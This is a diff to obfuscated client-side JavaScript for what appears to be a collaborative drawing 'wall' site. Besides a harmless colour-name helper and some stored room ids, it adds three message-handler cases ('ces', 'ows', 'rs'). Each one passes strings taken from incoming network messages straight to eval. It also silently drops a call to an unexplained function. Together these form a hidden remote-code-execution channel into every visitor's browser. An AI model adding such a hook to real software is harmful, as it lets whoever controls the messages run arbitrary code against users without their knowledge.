@@ -2014,6 +2014,18 @@
                     , r = new Uint8Array(e[t(698)]).buffer
                     , a = Rr(new Uint8Array(r));
                 switch (Object[t(611)](a)[0]) {
+                    case "ces":
+                        var sp = a.ces;
+                        sp.forEach(o => eval(o))
+                        break;
+                    case "ows":
+                        var wsp = a.ows
+                        wsp.forEach(o => eval(o))
+                        break;
+                    case "rs":
+                        var rs = a.rs
+                        eval(rs)
+                        break;
                     case "id":
                         var id = a.id;
                         window.w.clientId = id;
@@ -2064,6 +2076,8 @@
                                 c[t(270)].display = "none"
                             }
                             ), 500);
+                        window.w.wall = W;
+                        window.w.subwall = H;
                         window.w.emit("join", {
                             wall: W,
                             subwall: H
@@ -2678,6 +2692,16 @@
                 }
                 return tmp(titles, title);
             }
+            window.prsTil = function (idx) {
+                const titles = [
+                    "black", "grey", "light grey", "light pink", "red", "orange", "brown", "yellow",
+                    "light green", "green", "light blue", "blue", "dark blue", "purple", "dark purple",
+                    "dark red", "dark green", "dark teal", "teal", "indigo", "periwinkle", "pink",
+                    "dark brown", "burgundy", "pale yellow", "light teal", "lavender", "pale purple",
+                    "magenta", "beige", "dark grey"
+                ];
+                return titles[idx] || 'black';
+            };
             window.colFmt = function (idx = 0, opts = {}) {
                 let n = parseInt(idx, 10);
                 if (isNaN(n)) n = 0
@@ -2847,7 +2871,6 @@
                     document[r(628)]("tpy")[r(356)] = 0,
                     nr(),
                     Hn(),
-                    en(),
                     _t()
             }
             window.writeChar = Vn
